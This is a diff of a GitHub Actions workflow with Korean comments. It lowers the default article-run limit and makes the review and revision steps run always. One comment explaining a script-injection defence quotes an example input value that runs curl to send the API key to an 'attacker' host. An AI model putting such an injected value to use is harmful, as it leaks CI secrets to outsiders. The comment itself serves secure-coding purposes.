@@ -114,7 +114,10 @@ jobs:
           # run: 안에 ${{ }} 로 직접 넣으면 셸이 읽기 전에 문자열이 치환되어,
           # limit 에 `3"; curl attacker/$API_KEY; echo "` 같은 값을 넣는 것만으로
           # 이 스텝의 시크릿을 가진 채 임의 명령이 실행된다(스크립트 인젝션).
-          RUN_LIMIT: ${{ github.event.inputs.limit || '3' }}
+          # 3건이 18분을 넘겨 제한에 걸렸다. 한 건당 집필 + 평가 + 최대 3회 개정이라
+          # 실제 소요가 6분에 가깝다. 30분마다 도는 작업이 그만큼 걸리면 실행이 겹치고,
+          # 하루 48회를 도는 만큼 2건씩만 내도 하루 96건 여유가 있다.
+          RUN_LIMIT: ${{ github.event.inputs.limit || '2' }}
           RUN_FORCE: ${{ github.event.inputs.force || 'false' }}
         run: |
           case "$RUN_LIMIT" in
@@ -129,7 +132,11 @@ jobs:
       # 방금 낸 기사를 평가해 둔다. 결과는 data/reviews.json 에 쌓이고,
       # 다음 실행의 집필 프롬프트에 '이번에 특히 신경 쓸 것'으로 자동 반영된다.
       # 평가가 실패해도 기사 발행은 이미 끝났으므로 워크플로를 죽이지 않는다.
+      # `if: always()` 인 이유: 집필이 시간 제한에 걸려도 이 단계는 할 일이 있다.
+      # 대상은 디스크에 있는 기사이고, 이전 실행에서 남은 미달 기사도 여기서 처리된다.
+      # 집필 실패가 곧 검수 중단이 되면 품질 관리가 집필 성공에 인질로 잡힌다.
       - name: 기사 품질 평가
+        if: always()
         timeout-minutes: 4
         continue-on-error: true
         env:
@@ -153,6 +160,7 @@ jobs:
       # improve 는 4.5 미만이거나 근거 없는 주장이 있는 기사만 골라 다시 쓴다.
       # 이전 점수보다 나빠지면 되돌리므로 여러 번 돌아도 나빠지지 않는다.
       - name: 기준 미달 기사 개정
+        if: always()
         timeout-minutes: 5
         continue-on-error: true
         env:
